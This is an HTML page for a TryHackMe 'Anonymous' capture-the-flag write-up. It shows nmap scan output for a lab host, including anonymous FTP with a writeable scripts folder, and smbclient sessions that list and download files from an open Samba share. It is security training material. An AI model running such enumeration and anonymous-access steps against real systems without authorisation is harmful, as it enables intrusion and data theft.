@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonymous | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2024-12-30</span>
+                <span>// ID: REF-Anonymous</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Anonymous</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme, ctf -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<div class="codehilite"><pre><span></span><code><span class="mf">21</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="kr">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">         </span><span class="n">vsftpd</span><span class="w"> </span><span class="mf">2.0.8</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">later</span>
+<span class="err">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="n">anon</span><span class="p">:</span><span class="w"> </span><span class="n">Anonymous</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="nb">log</span><span class="n">in</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="p">(</span><span class="n">FTP</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="mf">230</span><span class="p">)</span>
+<span class="err">|</span><span class="n">_drwxrwxrwx</span><span class="w">    </span><span class="mf">2</span><span class="w"> </span><span class="mf">111</span><span class="w">      </span><span class="mf">113</span><span class="w">          </span><span class="mf">4096</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mf">04</span><span class="w">  </span><span class="mf">2020</span><span class="w"> </span><span class="n">scripts</span><span class="w"> </span><span class="err">[</span><span class="n">NSE</span><span class="p">:</span><span class="w"> </span><span class="n">writeable</span><span class="err">]</span>
+<span class="err">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="kr">sys</span><span class="n">t</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="n">STAT</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">status</span><span class="p">:</span>
+<span class="err">|</span><span class="w">      </span><span class="n">Connected</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="p">::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">10.21.16.42</span>
+<span class="err">|</span><span class="w">      </span><span class="nb">Log</span><span class="n">ged</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">ftp</span>
+<span class="err">|</span><span class="w">      </span><span class="n">TYPE</span><span class="p">:</span><span class="w"> </span><span class="nb">ASC</span><span class="n">II</span>
+<span class="err">|</span><span class="w">      </span><span class="n">No</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">bandwidth</span><span class="w"> </span><span class="n">limit</span>
+<span class="err">|</span><span class="w">      </span><span class="n">Session</span><span class="w"> </span><span class="n">timeout</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">seconds</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mf">300</span>
+<span class="err">|</span><span class="w">      </span><span class="kr">Cont</span><span class="n">rol</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">plain</span><span class="w"> </span><span class="n">text</span>
+<span class="err">|</span><span class="w">      </span><span class="kd">Data</span><span class="w"> </span><span class="n">connections</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">plain</span><span class="w"> </span><span class="n">text</span>
+<span class="err">|</span><span class="w">      </span><span class="n">At</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">startup</span><span class="p">,</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="mf">6</span>
+<span class="err">|</span><span class="w">      </span><span class="n">vsFTPd</span><span class="w"> </span><span class="mf">3.0.3</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">secure</span><span class="p">,</span><span class="w"> </span><span class="n">fast</span><span class="p">,</span><span class="w"> </span><span class="n">stable</span>
+<span class="err">|</span><span class="n">_End</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">status</span>
+<span class="mf">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="kr">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">         </span><span class="kr">Open</span><span class="n">SSH</span><span class="w"> </span><span class="mf">7.6</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">4</span><span class="n">ubuntu0</span><span class="mf">.3</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span>
+<span class="err">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="mf">2048</span><span class="w"> </span><span class="mf">8</span><span class="n">b</span><span class="p">:</span><span class="n">ca</span><span class="p">:</span><span class="mf">21</span><span class="p">:</span><span class="mf">62</span><span class="p">:</span><span class="mf">1</span><span class="n">c</span><span class="p">:</span><span class="mf">2</span><span class="n">b</span><span class="p">:</span><span class="mf">23</span><span class="p">:</span><span class="n">fa</span><span class="p">:</span><span class="mf">6</span><span class="n">b</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="mf">1</span><span class="n">f</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="mf">13</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="mf">1</span><span class="n">c</span><span class="p">:</span><span class="mf">68</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="err">|</span><span class="w">   </span><span class="mf">256</span><span class="w"> </span><span class="mf">95</span><span class="p">:</span><span class="mf">89</span><span class="p">:</span><span class="n">a4</span><span class="p">:</span><span class="mf">12</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="n">ab</span><span class="p">:</span><span class="mf">90</span><span class="p">:</span><span class="mf">5</span><span class="n">d</span><span class="p">:</span><span class="mf">45</span><span class="p">:</span><span class="mf">19</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="mf">41</span><span class="p">:</span><span class="mf">5</span><span class="n">f</span><span class="p">:</span><span class="mf">74</span><span class="p">:</span><span class="n">ce</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="err">|</span><span class="n">_</span><span class="w">  </span><span class="mf">256</span><span class="w"> </span><span class="n">e1</span><span class="p">:</span><span class="mf">2</span><span class="n">a</span><span class="p">:</span><span class="mf">96</span><span class="p">:</span><span class="n">a4</span><span class="p">:</span><span class="n">ea</span><span class="p">:</span><span class="mf">8</span><span class="n">f</span><span class="p">:</span><span class="mf">68</span><span class="p">:</span><span class="mf">8</span><span class="n">f</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="mf">74</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="mf">28</span><span class="p">:</span><span class="mf">72</span><span class="p">:</span><span class="mf">70</span><span class="p">:</span><span class="n">cd</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mf">139</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="kr">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w"> </span><span class="n">Samba</span><span class="w"> </span><span class="n">smbd</span><span class="w"> </span><span class="mf">3.</span><span class="n">X</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">4.</span><span class="n">X</span><span class="w"> </span><span class="p">(</span><span class="n">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span>
+<span class="mf">445</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="kr">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w"> </span><span class="n">Samba</span><span class="w"> </span><span class="n">smbd</span><span class="w"> </span><span class="mf">4.7.6</span><span class="o">-</span><span class="n">Ubuntu</span><span class="w"> </span><span class="p">(</span><span class="n">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span>
+<span class="n">Device</span><span class="w"> </span><span class="n">type</span><span class="p">:</span><span class="w"> </span><span class="n">general</span><span class="w"> </span><span class="n">purpose</span>
+<span class="kr">Run</span><span class="n">ning</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="mf">4.</span><span class="n">X</span>
+<span class="n">OS</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="p">:</span><span class="mf">4.15</span>
+<span class="n">OS</span><span class="w"> </span><span class="n">details</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="mf">4.15</span>
+<span class="n">Network</span><span class="w"> </span><span class="n">Distance</span><span class="p">:</span><span class="w"> </span><span class="mf">4</span><span class="w"> </span><span class="n">hops</span>
+<span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Host</span><span class="p">:</span><span class="w"> </span><span class="n">ANONYMOUS</span><span class="p">;</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="p">:</span>
+<span class="err">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mf">6.1</span><span class="w"> </span><span class="p">(</span><span class="n">Samba</span><span class="w"> </span><span class="mf">4.7.6</span><span class="o">-</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="err">|</span><span class="w">   </span><span class="n">Computer</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">anonymous</span>
+<span class="err">|</span><span class="w">   </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">computer</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">ANONYMOUS</span><span class="err">\</span><span class="n">x00</span>
+<span class="err">|</span><span class="w">   </span><span class="n">Domain</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="err">\</span><span class="n">x00</span>
+<span class="err">|</span><span class="w">   </span><span class="n">FQDN</span><span class="p">:</span><span class="w"> </span><span class="n">anonymous</span>
+<span class="err">|</span><span class="n">_</span><span class="w">  </span><span class="kr">Sys</span><span class="n">tem</span><span class="w"> </span><span class="n">time</span><span class="p">:</span><span class="w"> </span><span class="mf">2025</span><span class="o">-</span><span class="mf">10</span><span class="o">-</span><span class="mf">12</span><span class="n">T19</span><span class="p">:</span><span class="mf">51</span><span class="p">:</span><span class="mf">09</span><span class="o">+</span><span class="mf">00</span><span class="p">:</span><span class="mf">00</span>
+<span class="err">|</span><span class="n">_nbstat</span><span class="p">:</span><span class="w"> </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">ANONYMOUS</span><span class="p">,</span><span class="w"> </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">user</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">MAC</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">unknown</span><span class="p">)</span>
+<span class="err">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mf">054</span><span class="p">:</span><span class="w"> </span><span class="n">false</span>
+<span class="err">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">regsvc</span><span class="o">-</span><span class="n">dos</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="n">VULNERABLE</span><span class="p">:</span>
+<span class="err">|</span><span class="w">   </span><span class="n">Service</span><span class="w"> </span><span class="n">regsvc</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="kr">sys</span><span class="n">tems</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="n">denial</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">service</span>
+<span class="err">|</span><span class="w">     </span><span class="n">State</span><span class="p">:</span><span class="w"> </span><span class="n">VULNERABLE</span>
+<span class="err">|</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">regsvc</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mf">2000</span><span class="w"> </span><span class="kr">sys</span><span class="n">tems</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="n">denial</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">caused</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">null</span><span class="w"> </span><span class="kd">def</span><span class="n">erence</span>
+<span class="err">|</span><span class="w">       </span><span class="n">pointer</span><span class="mf">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">crash</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="kr">if</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">vulnerable</span><span class="mf">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">discovered</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">Ron</span><span class="w"> </span><span class="n">Bowes</span>
+<span class="err">|</span><span class="w">       </span><span class="n">while</span><span class="w"> </span><span class="n">working</span><span class="w"> </span><span class="kr">on</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">sessions</span><span class="mf">.</span>
+<span class="err">|</span><span class="n">_</span><span class="w">          </span>
+<span class="err">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="n">date</span><span class="p">:</span><span class="w"> </span><span class="mf">2025</span><span class="o">-</span><span class="mf">10</span><span class="o">-</span><span class="mf">12</span><span class="n">T19</span><span class="p">:</span><span class="mf">50</span><span class="p">:</span><span class="mf">48</span>
+<span class="err">|</span><span class="n">_</span><span class="w">  </span><span class="n">start_date</span><span class="p">:</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span>
+<span class="err">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="mf">3</span><span class="p">:</span><span class="mf">1</span><span class="p">:</span><span class="mf">1</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">required</span>
+<span class="err">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mf">061</span><span class="p">:</span><span class="w"> </span><span class="n">false</span>
+<span class="err">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="err">|</span><span class="w">   </span><span class="n">account_used</span><span class="p">:</span><span class="w"> </span><span class="n">guest</span>
+<span class="err">|</span><span class="w">   </span><span class="n">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="n">user</span>
+<span class="err">|</span><span class="w">   </span><span class="n">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="n">supported</span>
+<span class="err">|</span><span class="n">_</span><span class="w">  </span><span class="n">message_signing</span><span class="p">:</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="p">(</span><span class="n">dangerous</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="kd">def</span><span class="n">ault</span><span class="p">)</span>
+<span class="err">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span><span class="w"> </span><span class="n">mean</span><span class="p">:</span><span class="w"> </span><span class="mf">12</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">deviation</span><span class="p">:</span><span class="w"> </span><span class="mf">42</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">median</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="n">s</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>❯<span class="w"> </span><span class="nv">smbclient</span><span class="w"> </span><span class="o">-</span><span class="nv">L</span><span class="w"> </span><span class="mi">10</span>.<span class="mi">201</span>.<span class="mi">110</span>.<span class="mi">36</span>
+<span class="nv">Password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>[<span class="nv">WORKGROUP</span>\<span class="nv">kali</span>]:
+
+<span class="w">        </span><span class="nv">Sharename</span><span class="w">       </span><span class="nv">Type</span><span class="w">      </span><span class="nv">Comment</span>
+<span class="w">        </span><span class="o">---------</span><span class="w">       </span><span class="o">----</span><span class="w">      </span><span class="o">-------</span>
+<span class="w">        </span><span class="nv">print</span>$<span class="w">          </span><span class="nv">Disk</span><span class="w">      </span><span class="nv">Printer</span><span class="w"> </span><span class="nv">Drivers</span>
+<span class="w">        </span><span class="nv">pics</span><span class="w">            </span><span class="nv">Disk</span><span class="w">      </span><span class="nv">My</span><span class="w"> </span><span class="nv">SMB</span><span class="w"> </span><span class="nv">Share</span><span class="w"> </span><span class="nv">Directory</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">Pics</span>
+<span class="w">        </span><span class="nv">IPC</span>$<span class="w">            </span><span class="nv">IPC</span><span class="w">       </span><span class="nv">IPC</span><span class="w"> </span><span class="nv">Service</span><span class="w"> </span><span class="ss">(</span><span class="nv">anonymous</span><span class="w"> </span><span class="nv">server</span><span class="w"> </span><span class="ss">(</span><span class="nv">Samba</span>,<span class="w"> </span><span class="nv">Ubuntu</span><span class="ss">))</span>
+<span class="nv">Reconnecting</span><span class="w"> </span><span class="nv">with</span><span class="w"> </span><span class="nv">SMB1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">workgroup</span><span class="w"> </span><span class="nv">listing</span>.
+
+<span class="w">        </span><span class="nv">Server</span><span class="w">               </span><span class="nv">Comment</span>
+<span class="w">        </span><span class="o">---------</span><span class="w">            </span><span class="o">-------</span>
+
+<span class="w">        </span><span class="nv">Workgroup</span><span class="w">            </span><span class="nv">Master</span>
+<span class="w">        </span><span class="o">---------</span><span class="w">            </span><span class="o">-------</span>
+<span class="w">        </span><span class="nv">WORKGROUP</span><span class="w">            </span><span class="nv">ANONYMOUS</span>
+❯<span class="w"> </span><span class="nv">smbclient</span><span class="w"> </span><span class="o">//</span><span class="mi">10</span>.<span class="mi">201</span>.<span class="mi">110</span>.<span class="mi">36</span><span class="o">/</span><span class="nv">pics</span>
+<span class="nv">Password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>[<span class="nv">WORKGROUP</span>\<span class="nv">kali</span>]:
+<span class="nv">Try</span><span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">get</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">list</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">possible</span><span class="w"> </span><span class="nv">commands</span>.
+<span class="nv">smb</span>:<span class="w"> </span>\<span class="o">&gt;</span><span class="w"> </span><span class="nv">dir</span>
+<span class="w">  </span>.<span class="w">                                   </span><span class="nv">D</span><span class="w">        </span><span class="mi">0</span><span class="w">  </span><span class="nv">Sun</span><span class="w"> </span><span class="nv">May</span><span class="w"> </span><span class="mi">17</span><span class="w"> </span><span class="mi">07</span>:<span class="mi">11</span>:<span class="mi">34</span><span class="w"> </span><span class="mi">2020</span>
+<span class="w">  </span>..<span class="w">                                  </span><span class="nv">D</span><span class="w">        </span><span class="mi">0</span><span class="w">  </span><span class="nv">Wed</span><span class="w"> </span><span class="nv">May</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="mi">21</span>:<span class="mi">59</span>:<span class="mi">10</span><span class="w"> </span><span class="mi">2020</span>
+<span class="w">  </span><span class="nv">corgo2</span>.<span class="nv">jpg</span><span class="w">                          </span><span class="nv">N</span><span class="w">    </span><span class="mi">42663</span><span class="w">  </span><span class="nv">Mon</span><span class="w"> </span><span class="nv">May</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">20</span>:<span class="mi">43</span>:<span class="mi">42</span><span class="w"> </span><span class="mi">2020</span>
+<span class="w">  </span><span class="nv">puppos</span>.<span class="nv">jpeg</span><span class="w">                         </span><span class="nv">N</span><span class="w">   </span><span class="mi">265188</span><span class="w">  </span><span class="nv">Mon</span><span class="w"> </span><span class="nv">May</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">20</span>:<span class="mi">43</span>:<span class="mi">42</span><span class="w"> </span><span class="mi">2020</span>
+
+<span class="w">                </span><span class="mi">20508240</span><span class="w"> </span><span class="nv">blocks</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">size</span><span class="w"> </span><span class="mi">1024</span>.<span class="w"> </span><span class="mi">13306808</span><span class="w"> </span><span class="nv">blocks</span><span class="w"> </span><span class="nv">available</span>
+<span class="nv">smb</span>:<span class="w"> </span>\<span class="o">&gt;</span><span class="w"> </span><span class="nv">get</span><span class="w"> </span><span class="nv">corgo2</span>.<span class="nv">jpg</span>
+<span class="nv">getting</span><span class="w"> </span><span class="nv">file</span><span class="w"> </span>\<span class="nv">corgo2</span>.<span class="nv">jpg</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">size</span><span class="w"> </span><span class="mi">42663</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">corgo2</span>.<span class="nv">jpg</span><span class="w"> </span><span class="ss">(</span><span class="mi">14</span>.<span class="mi">9</span><span class="w"> </span><span class="nv">KiloBytes</span><span class="o">/</span><span class="nv">sec</span><span class="ss">)</span><span class="w"> </span><span class="ss">(</span><span class="nv">average</span><span class="w"> </span><span class="mi">14</span>.<span class="mi">9</span><span class="w"> </span><span class="nv">KiloBytes</span><span class="o">/</span><span class="nv">sec</span><span class="ss">)</span>
